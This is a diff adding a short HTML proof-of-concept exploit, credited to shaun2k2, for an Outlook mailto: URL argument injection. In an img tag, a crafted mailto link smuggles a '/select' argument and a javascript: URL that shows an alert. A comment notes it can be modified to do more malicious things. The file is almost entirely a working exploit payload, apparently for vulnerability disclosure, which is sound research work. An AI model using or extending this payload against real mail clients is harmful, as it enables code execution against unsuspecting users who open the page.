@@ -1,0 +1,15 @@
+<!-- Outlook mailto: URL argument injection
+proof-of-concept exploit,
+     by shaun2k2.  The exploit can be easily modified
+to execute more
+     malicious things.
+-->
+
+<html>
+<body>
+<!-- This is the exploit string. -->
+<img src="mailto:aa&quot; /select
+javascript:alert('vulnerable')">
+</body>
+</html>
+
